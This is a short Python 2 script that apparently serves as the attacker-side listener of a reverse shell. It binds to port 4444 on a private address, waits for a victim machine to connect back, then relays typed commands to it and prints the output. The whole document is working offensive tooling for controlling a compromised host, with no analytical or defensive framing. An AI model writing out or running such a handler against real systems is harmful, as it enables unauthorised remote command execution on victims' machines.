import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.116.128", 4444))
listener.listen(0)
print("[+] Waiting For Incoming Connections")
connection, address = listener.accept()
print("[+] Got A Connection from " + str(address))

while True:
    command = raw_input('>>')
    connection.send(command)
    result = connection.recv(1024)
    print (result)
